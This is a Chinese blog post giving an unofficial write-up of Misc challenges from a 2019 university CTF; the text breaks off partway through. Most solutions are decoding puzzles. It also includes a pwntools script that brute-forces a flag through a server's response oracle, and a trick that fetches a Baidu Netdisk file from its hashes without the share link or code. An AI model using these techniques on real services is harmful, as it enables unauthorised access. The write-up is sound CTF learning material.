<!doctype html><html lang="zh-Hans"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1,maximum-scale=1,shrink-to-fit=no" name="viewport"><meta content="webkit" name="renderer"><meta content="webkit" name="force-rendering"><meta content="✨小透明・宸✨" name="author"><meta content="" name="keywords"><meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png" rel="icon shortcut" type="image/ico"><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png" rel="icon"><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png" rel="apple-touch-icon"><link href="/atom.xml" rel="alternate" type="application/atom+xml"><title>2019 年暨南大学“新生杯”CTF Write-Up | 存在感消失的地方|ω•`)</title><script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":"https://akarin.dev","headline":"2019 年暨南大学“新生杯”CTF Write-Up","datePublished":"2019-11-16T13:50:28.000Z","dateModified":"2019-11-16T13:50:28.000Z","author":{"@type":"Person","name":"✨小透明・宸✨","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/avatar.jpg"},"description":"身处寒夜 把握星光✨"},"publisher":{"@type":"Organization","name":"存在感消失的地方|ω•`)","logo":"https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png"},"keywords":"","description":"非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•'-'•) ✧"}</script><script>/MSIE|Trident/.test(navigator.userAgent)&&(location.href="../../../../upgrade-browser.html")</script><script>window.switchDark=t=>{const a={auto:"mdui-theme-layout-auto",enable:"mdui-theme-layout-dark",disable:""};(t=t||localStorage.getItem("dark"))in a||(t="auto");for(const e in a)a[e]&&document.body.classList[e===t?"add":"remove"](a[e]);localStorage.setItem("dark",t)},addEventListener("DOMContentLoaded",()=>switchDark());</script><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/css/mdui.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/combine/npm/aplayer@1/dist/APlayer.min.css,npm/prismjs@1/plugins/line-numbers/prism-line-numbers.min.css,npm/prism-themes@1/themes/prism-vsc-dark-plus.min.css,gh/TransparentLC/transparentlc.github.io/css/style.min.css" rel="stylesheet"><style>*{--sidebar-image:url(https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/sidebar_header.jpg);--sidebar-image-color:#958981;--banner-image:url(https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/daily_pic.png);--banner-image-color:#f09ea3;--post-thumbnail-color:#f09ea3;--copy-code-btn-color:#fff}</style><meta content="Hexo 5.4.0" name="generator"></head><body class="mdui-drawer-body-left mdui-theme-accent-pink mdui-theme-primary-pink"><button class="mdui-fab mdui-m-a-2 mdui-shadow-0 mdui-text-color-grey-700" mdui-drawer="{target:'#akarin-drawer'}" style="position:fixed;z-index:1"><i class="material-icons mdui-icon">menu</i></button><nav class="mdui-drawer mdui-drawer-full-height mdui-shadow-6" id="akarin-drawer"><div class="akarin-util-bg-cover mdui-p-x-2" id="akarin-drawer-media"><img src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/avatar.jpg" class="akarin-hover-spin mdui-img-circle mdui-m-t-4" id="akarin-drawer-avatar"><div class="akarin-util-text-gradient mdui-card-media-covered"><div class="mdui-card-primary"><div class="mdui-typo-subheading">✨小透明・宸✨</div><div class="akarin-util-opacity-half mdui-typo-caption">存在感消失的地方|ω•`)</div></div></div></div><div class="mdui-list" mdui-collapse><div><a href="../../../../" class="mdui-ripple mdui-list-item"><i class="material-icons mdui-icon mdui-list-item-icon">home</i> <span class="mdui-list-item-content">主页</span></a></div><div><a href="../../../../about" class="mdui-ripple mdui-list-item"><i class="material-icons mdui-icon mdui-list-item-icon">person</i> <span class="mdui-list-item-content">关于</span></a></div><div><a href="../../../../friend" class="mdui-ripple mdui-list-item"><i class="material-icons mdui-icon mdui-list-item-icon">link</i> <span class="mdui-list-item-content">友链</span></a></div><div><a href="https://github.com/TransparentLC" class="mdui-ripple mdui-list-item" rel="noopener" target="_blank"><i class="material-icons mdui-icon mdui-list-item-icon">code</i> <span class="mdui-list-item-content">GitHub</span></a></div><div><a href="../../../../archives" class="mdui-ripple mdui-list-item"><i class="material-icons mdui-icon mdui-list-item-icon">collections_bookmark</i> <span class="mdui-list-item-content">归档</span> <small class="akarin-drawer-badge mdui-color-theme-accent">30</small></a></div><div><a href="../../../../atom.xml" class="mdui-ripple mdui-list-item"><i class="material-icons mdui-icon mdui-list-item-icon">rss_feed</i> <span class="mdui-list-item-content">RSS</span></a></div><div class="mdui-divider"></div><div class="mdui-collapse-item mdui-collapse-item-open"><div class="mdui-ripple mdui-list-item mdui-collapse-item-header"><i class="material-icons mdui-icon mdui-list-item-icon">brightness_4</i> <span class="mdui-list-item-content">深色模式</span> <i class="material-icons mdui-icon mdui-collapse-item-arrow">keyboard_arrow_down</i></div><div class="mdui-list mdui-collapse-item-body"><div class="mdui-ripple mdui-list-item" data-dark="auto"><span class="mdui-list-item-content">根据系统主题切换</span></div><div class="mdui-ripple mdui-list-item" data-dark="enable"><span class="mdui-list-item-content">启用</span></div><div class="mdui-ripple mdui-list-item" data-dark="disable"><span class="mdui-list-item-content">禁用</span></div></div></div><div class="mdui-collapse-item mdui-collapse-item-open"><div class="mdui-ripple mdui-list-item mdui-collapse-item-header"><i class="material-icons mdui-icon mdui-list-item-icon">insert_chart</i> <span class="mdui-list-item-content">访问统计</span> <i class="material-icons mdui-icon mdui-collapse-item-arrow">keyboard_arrow_down</i></div><div class="mdui-list mdui-collapse-item-body"><div class="mdui-ripple mdui-list-item"><span class="mdui-list-item-content">站点访问量</span> <small class="akarin-drawer-badge mdui-color-theme-accent" id="busuanzi_value_site_pv">Loading</small></div><div class="mdui-ripple mdui-list-item"><span class="mdui-list-item-content">站点访客数</span> <small class="akarin-drawer-badge mdui-color-theme-accent" id="busuanzi_value_site_uv">Loading</small></div><div class="mdui-ripple mdui-list-item"><span class="mdui-list-item-content">页面访问量</span> <small class="akarin-drawer-badge mdui-color-theme-accent" id="busuanzi_value_page_pv">Loading</small></div></div></div></div></nav><picture id="akarin-top" title="返回顶部"><source srcset="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/top.avif" type="image/avif"><source srcset="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/top.webp" type="image/webp"><img src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/top.png"></picture><div style="padding-top:20px"></div><div class="mdui-hidden-sm-down" style="padding-top:40px"></div><div class="mdui-hidden-md-down" style="padding-top:40px"></div><main class="mdui-container" style="max-width:1024px"><div class="akarin-util-rounded-5 mdui-card mdui-shadow-4"><div class="mdui-ripple akarin-post-bg akarin-util-bg-cover" data-src="https://ae01.alicdn.com/kf/H4f96579cce3f4cfdb3ba757207bd95daK.jpg" data-src-avif="https://vfile.meituan.net/mmdb/3d113ccf298e7e6104cb975b42b1f1ec77864.jpg" data-src-webp="https://ae01.alicdn.com/kf/Ha943daeb9074416db283e6255212d851N.jpg"><div class="akarin-util-bg-cover akarin-post-bg akarin-blurred-cover" style="background-image:url(data:image/jpeg;base64,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)"></div><div class="akarin-util-text-gradient akarin-post-title"><div class="mdui-card-primary"><div class="mdui-card-primary-title mdui-text-color-white-text">2019 年暨南大学“新生杯”CTF Write-Up</div></div></div></div><div class="mdui-valign mdui-card-header"><div><img src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/avatar.jpg" class="akarin-hover-spin mdui-card-header-avatar"><div class="mdui-card-header-title">✨小透明・宸✨</div><div class="mdui-card-header-subtitle">2019-11-16 21:50:28</div></div></div><article class="mdui-p-a-3 mdui-card-content mdui-typo"><div class="aplayer aplayer-tag-marker" style="margin-bottom:20px" id="aplayer-SwPDtsAb"><pre class="aplayer-lrc-content"></pre></div><script>(window.aplayers||(window.aplayers=[])).push({element:document.getElementById("aplayer-SwPDtsAb"),narrow:!1,autoplay:!1,showlrc:!1,music:{title:"START：DASH！！",author:"μ's",url:"https://files.catbox.moe/hxkmbz.m4a",pic:"https://ae01.alicdn.com/kf/HTB1W51WNwHqK1RjSZFkq6x.WFXau.jpg",lrc:""}})</script><p>最近因为各种杂七杂八的事情忙到爆炸，很久都没有更新文章了，被 CTF 折腾也是忙到爆炸的原因之一_(:_」∠)_</p><p>这个比赛其实去年小透明参加过，然鹅因为当时<del>姿势水平不足</del>，结果只能在六七十名的后排位置看菊苣们刷分。</p><p>（重在参与，重在参与！）</p><img data-src="https://ae01.alicdn.com/kf/H30ab574d7d16485192a29e82f4d642adB.jpg" data-src-webp="https://ae01.alicdn.com/kf/H6acc1bb67c93432fa5010866066df1ecU.jpg"><p>一年过去了，小透明似乎还是一直都没有真正意义上地“特训”过 CTF（只是在开始前一周把某在线题库的“新手区”过了一遍），结果在比赛前夕突然听说了班上有某君<strong>从暑假开始，每天练习一道 CTF 题</strong>，还是门槛相对较高的<strong>逆向题</strong>的消息，再想到各种“聚沙成塔”“坚持不懈”“不劳无获”“龟兔赛跑”之类的鸡汤……</p><p>由于竞争的存在，小透明参赛的动机开始<del>被一点点地扭曲</del>(｡í _ ì｡) 从一开始的<strong>“过来玩一玩”</strong>变成了各种<strong>“不能被○○超过了”</strong>，到了最后目标变成了<strong>“尝试超过那位已从本校计科专业毕业的传说级菊苣”</strong>，结果就是小透明在这一周用尽了几乎所有的精力来肝比赛，然后……</p><img data-src="https://ae01.alicdn.com/kf/Ub97ca8e264c64830a051ff01093953eeZ.png" data-src-webp="https://ae01.alicdn.com/kf/Hde8e238f05be46f78c86bba330ce34a1t.jpg"><p>虽然得了第一位，但是大概是因为太累了，还有天气变化的关系，结果在比赛进行到后期的时候似乎是感冒了……果然还是不应该勉强自己，周末坐校车回家时头又疼又晕的感觉太难受了ﾍ(‘.’o)（虽然现在已经没那么不舒服啦）</p><p>这是个<strong>非官方</strong>的 Write-Up，内容<strong>仅限于自己当时做出来的部分题目</strong>。官方版的 Write-Up 应该会在<a href="http://blog.leanote.com/xp0int" target="_blank" rel="noopener">主办方 Xp0int 的博客</a>上更新，不过小透明本来就有打算自己写一份放在这里，至少当成一个记录好了～٩(ˊᗜˋ*)و</p><blockquote><p><a href="http://blog.leanote.com/post/xp0int/2019%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A6-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup" target="_blank" rel="noopener">官方 Write-Up</a> 已放出，相比这里的非官方 Write-Up 多出了以下题目的题解：</p><ul><li>Misc<ul><li>orzzzxzz</li></ul></li><li>Reverse<ul><li>binary</li></ul></li><li>Web<ul><li>Image Checker</li><li>unserialize</li></ul></li><li>pwn<ul><li>inversion</li><li>syscall</li></ul></li></ul><p>↑都是当时不会做的题（笑）</p><p>另外也公布了题目源码和附件：<a href="https://github.com/xf1les/2019JNUCTF" target="_blank" rel="noopener">xf1les/2019JNUCTF</a></p></blockquote><p><em>题目实在太多了，可以点击左边的“目录”菜单，直接传送到某个题目的 Write-Up～</em></p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="O-N-E-O-F-U-S"><a href="#O-N-E-O-F-U-S" class="headerlink" title="O N E O F U S"></a>O N E O F U S</h2><p>不知道为什么，MPC-HC 直接打开视频本体就是 flag 了，<del>所以这题白给 2333</del></p><img data-src="https://ae01.alicdn.com/kf/Uc2c1b990d10d43fea4e29c238fc781c7e.png" data-src-webp="https://ae01.alicdn.com/kf/Ha4981586fa5b48a982b7a972168ec1d6R.jpg"><p>正经的解法：这个 MKV 有两个视频流，flag 藏在某个视频流里面，使用 FFmpeg 就可以把这个流单独拆出来。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffmpeg -i oneofus.mkv -map <span class="token number">0</span>:2 -c copy oneofus.jpg<span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre><h2 id="LoLo"><a href="#LoLo" class="headerlink" title="LoLo"></a>LoLo</h2><p>蓝色盲水印，出门右转：<a href="https://github.com/linyacool/blind-watermark/tree/python3" target="_blank" rel="noopener">GitHub linyacool/blind-watermark</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">decode.py --original lolo_1.png --image lolo_2.png --result lolo_3.png<span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/U19a7d709be264d51ab7a7bd55978152bW.png" data-src-webp="https://ae01.alicdn.com/kf/H18da7c4d49a843c09e05896083981211x.jpg"><p>不过小透明忍不住想吐槽一下这题，因为……</p><p><strong>完 全 一 致</strong></p><p>实际上这题和去年“新生杯”的类似题用的是同一种盲水印。比赛前还想着“今年是不是又要出一个一模一样的”，没想到真的出了(´ﾟωﾟ｀)</p><p>但是去年的<a href="http://blog.leanote.com/post/xp0int/%E6%9F%AF%E5%93%80" target="_blank" rel="noopener">官方 Write-Up</a> 里面都在自我吐槽“这题出的不是很好，有些盲水印脚本无法解出答案，暂时未去了解为什么”了啊！而且周围有不少小伙伴们试过好几种其它的盲水印工具，确实都解不出来，所以这题实际上是在考信息搜索能力……？(=’_‘=)</p><h2 id="wewuwewu"><a href="#wewuwewu" class="headerlink" title="wewuwewu"></a>wewuwewu</h2><p>首先，这实际上是个 JPEG 图片。然后，翻二进制数据的话……</p><img data-src="https://ae01.alicdn.com/kf/U792671448653417b88e40c28b91e82779.png" data-src-webp="https://ae01.alicdn.com/kf/Hbbb0371371d640b38e12787e03ef3c6ai.jpg"><h2 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h2><img data-src="https://ae01.alicdn.com/kf/H7739931f6438448380be519b567b6ee87.png" data-src-webp="https://ae01.alicdn.com/kf/H41d2b01b50fb45bea22f7b478a8aa617r.jpg"><p>左起，每个色块的颜色和对应的字符：</p><ul><li>0x000031 1</li><li>0x300000 0</li><li>0x003100 1</li><li>0x000031 1</li><li>0x630000 c</li><li>0x006800 h</li><li>0x000041 A</li><li>0x730000 s</li><li>0x000033 3</li><li>0x5f0000 _</li><li>0x003100 1</li><li>0x480000 H</li><li>0x006500 e</li><li>0x5f0000 _</li><li>0x007200 r</li><li>0x000061 a</li><li>0x004900 I</li><li>0x6e0000 n</li><li>0x000062 b</li><li>0x003000 0</li><li>0x000077 w</li><li>0x002100 !</li><li>0x000021 !</li><li>0x003100 1</li><li>0x000032 2</li><li>0x003200 2</li><li>0x000037 7</li></ul><p>加上 flag 的头和尾，得到的就是 <code>flag&#123;1011chAs3_1He_raInb0w!!1227&#125;</code>。</p><h2 id="NoMansLand"><a href="#NoMansLand" class="headerlink" title="NoMansLand"></a>NoMansLand</h2><img data-src="https://ae01.alicdn.com/kf/U024afe9149fe47deb99b91e1483f02570.png" data-src-webp="https://ae01.alicdn.com/kf/Hcfee6d848ea040a68b3dc0ad7258a9a7X.jpg"><p><del>改一个字就加一个 Commit，这样我的 GitHub 主页上的日历也可以是绿油油的一片啦！</del></p><h2 id="Music"><a href="#Music" class="headerlink" title="Music"></a>Music</h2><img data-src="https://ae01.alicdn.com/kf/Ud0527412a156492ca70f29d9249759430.png" data-src-webp="https://ae01.alicdn.com/kf/Hf4acfaa1e15f4e1c9d653a8cfbcdcf81X.jpg"><p>音符加密（<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">这里</a>是工具），这道题和“与佛论禅”、核心价值观是一个性质……</p><h2 id="carefully"><a href="#carefully" class="headerlink" title="carefully"></a>carefully</h2><img data-src="https://ae01.alicdn.com/kf/U0497674513654a3cb039b5cf395d6481B.png" data-src-webp="https://ae01.alicdn.com/kf/H60aae98ea6354dca8c47571afb91337cT.jpg"><p>核心价值观解密（<a href="https://z.duoluosb.com/" target="_blank" rel="noopener">这里</a>是工具），得到 <code>g1v_vmxibk1rlm_1h_u4mmb_4m1_45yv11vezyov</code>，试了各种单表替换密码后发现是密码是反方向字母表，又称 Atbash（<a href="https://tool.bugku.com/jiemi/" target="_blank" rel="noopener">这里</a>是工具），数字和下划线不参与编码（看上去确实是这么回事），最后得到 <code>flag&#123;t1e_encryp1ion_1s_f4nny_4n1_45be11evable&#125;</code>。</p><img data-src="https://ae01.alicdn.com/kf/U031ce1068e854bedaba00d03ca98137fY.png" data-src-webp="https://ae01.alicdn.com/kf/Ha2e87479a8e74057ba44c8925555112eJ.jpg"><h2 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h2><p>个人觉得是 Misc 里最有技术含量的一题，大概是因为需要用到脚本？</p><img data-src="https://ae01.alicdn.com/kf/Ub502739007b84aa1904517969450d7c5L.png" data-src-webp="https://ae01.alicdn.com/kf/H116bbd6e49074b9d947ede6d03e69865M.jpg"><p>用 pwntools 连上服务器，这个藏着的东西大概就是 flag 了，如果输错了会返回 <code>Oops!</code>，全部输对了应该会有提示，那如果部分输对了话……</p><p>是<strong>没有任何输出</strong>的哦？|･ω･｀)</p><p>根据惯例，flag 应该由大小写字母和数字和各种符号组成，开头必然是 <code>flag&#123;</code>，剩下的就需要一个个慢慢<strong>爆破</strong>了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># 已知的前几个字</span>
flag <span class="token operator">=</span> <span class="token string">'flag&#123;'</span>
<span class="token comment"># 为了加快爆破速度，按照字符在 flag 中的出现概率降序排列字符集（滑稽）</span>
charset <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789-_ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;!'</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'35.194.143.125'</span><span class="token punctuation">,</span> <span class="token number">30001</span><span class="token punctuation">)</span>

<span class="token comment"># 爆破的原理是从字符集中逐个尝试将字符追加到已知的 flag 后面</span>
<span class="token comment"># 如果错误，下一行就是 Oops!</span>
<span class="token comment"># 如果正确，下一行就是 I wanna give you sth</span>
<span class="token comment"># 如果追加的字符是 &#125;，就结束爆破输出 flag</span>
akarin_have_girlfriend <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token keyword">while</span> <span class="token keyword">not</span> akarin_have_girlfriend<span class="token punctuation">:</span>
    end <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>flag <span class="token operator">+</span> char<span class="token punctuation">)</span>
        result <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Trying: '</span> <span class="token operator">+</span> char<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result <span class="token operator">==</span> <span class="token string">'Oops!\n'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Fail.'</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> result <span class="token operator">==</span> <span class="token string">'I wanna give you sth\n'</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> char
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Found! Now Akarin get: '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
                end <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> end<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The flag is: '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/Ub944719cd46f439eb892f6f2ae998ac0Y.png" data-src-webp="https://ae01.alicdn.com/kf/H7c078b8f02604a1fbabc5754a4446b70j.jpg"><p><code>flag&#123;Pyth0n_1s_s0_mmmmmm4g1111calll!!!&#125;</code>，不过爆破成功了却连个提示语都没有，不应该啊ﾍ(‘.’o)</p><p><del>由此可见，Python 是世界上最好的语言！</del>（PHP 党激怒）</p><h2 id="nopan"><a href="#nopan" class="headerlink" title="nopan"></a>nopan</h2><blockquote><p>“知道百度网盘怎样上传文件吗？”——官方提示</p></blockquote><p>没有尝试过各种手段和在<del>即将进入全面小康社会的</del> 9102 年仍然坚持通过限速让用户<strong>梦回二十年前用拨号上网的速度下载文件</strong>的万恶的百度网盘做过斗争的人，大概是做不出这题的|-` )</p><blockquote><p>好久不见。上次你提到的那个文件，我已经把它上传到■■网盘里了。网盘链接和提取码如下：</p><p>链接：<a href="https://pan.baidu.com/s/1ehuW4C6s16Wm4U91f7kKCw" target="_blank" rel="noopener">https://pan.■■■■■.com/s/1ehuW4C6s16Wm4U91f7kKCw</a><br>提取码：■■■■</p><p>最近我很忙，可能要很久才能回复。注意别把链接和提取码搞丢了。</p></blockquote><p><del>但是你真的就弄丢了⊂彡☆))д`)</del></p><blockquote><p>最近网盘的下载速度越来越慢了。我担心你文件没有下载完，网络就断开了。以防万一，请校检下载的文件是否符合以下哈希值：</p><p>文件名：■■■■■■■■<br>文件大小: 2865514（2.8MB）<br>MD5 : 3571407E1F0D73B789F2232448680CD1<br>SHA-1: 0561C239AA1F29A68269FC8A03E442E691CBF6FA<br>CRC32: 0E250626</p></blockquote><p><del>你也知道辣鸡百度网盘限速啊？</del></p><img data-src="https://ae01.alicdn.com/kf/Uba2833a5a2ad46a08f71f591f60e5246y.png" data-src-webp="https://ae01.alicdn.com/kf/Hbba04230277d4a4cbbe04c9a0b606f43x.jpg"><p>各种“万能钥匙”并没有什么效果，强行爆破那个分享链接的密码更是不可能的事情。</p><p>实际上，分享链接不重要，这几个 Hash 才是重点。题目的附件还有上面这张图片，用 Photoshop 打开会提示“遇到意外的文件尾”等等，显然是图片的数据被强行截断了。当然，分享的文件名应该就是 <code>flag.png</code>。</p><p>有个命令行版百度网盘客户端 <a href="https://github.com/iikira/BaiduPCS-Go" target="_blank" rel="noopener">BaiduPCS-Go</a> 自带了“手动秒传”的功能。百度网盘秒传的原理是判断文件的长度、完整文件和文件的前 256KB 的 MD5、CRC32。现在这些值都有了，就可以把文件<strong>直接秒传</strong>到自己的网盘上。</p><p>“文件的前 256KB 的 MD5”可以通过现在手上的这半截图片再截取前 256KB，然后用各种工具算出来：<code>875B6EB10090EB3127D206F35A4B277E</code></p><p>然后使用 BaiduPCS-Go 输入命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ru -length<span class="token operator">=</span><span class="token number">2865514</span> -md5<span class="token operator">=</span>3571407E1F0D73B789F2232448680CD1 -crc32<span class="token operator">=</span>0E250626 -slicemd5<span class="token operator">=</span>875B6EB10090EB3127D206F35A4B277E /flag.png
